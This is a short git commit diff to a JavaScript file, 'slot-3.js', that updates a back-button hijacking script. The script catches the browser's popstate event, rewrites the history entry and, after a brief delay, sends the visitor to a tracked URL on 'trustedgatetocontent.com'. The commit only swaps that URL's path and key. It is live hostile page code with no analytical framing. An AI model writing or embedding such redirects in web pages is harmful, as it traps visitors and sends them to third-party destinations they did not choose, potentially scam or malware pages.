91f6d8a8b6f03069d409c1baca5f9bc2a146de4d
brianfinch-bit <85077897+brianfinch-bit@users.noreply.github.com>
2021-11-09 19:35:31 +0700

    Update slot-3.js

--- slot-3.js
+++ slot-3.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://www.trustedgatetocontent.com/b2f5djfp?key=37de340e4bf2cb2979337d411d30b2c4");
+      location.replace("https://www.trustedgatetocontent.com/eg6cnn35ax?key=4976fb77b439e3d198c9b3c86ffb1bcc");
     },10);
   }
 }, false);
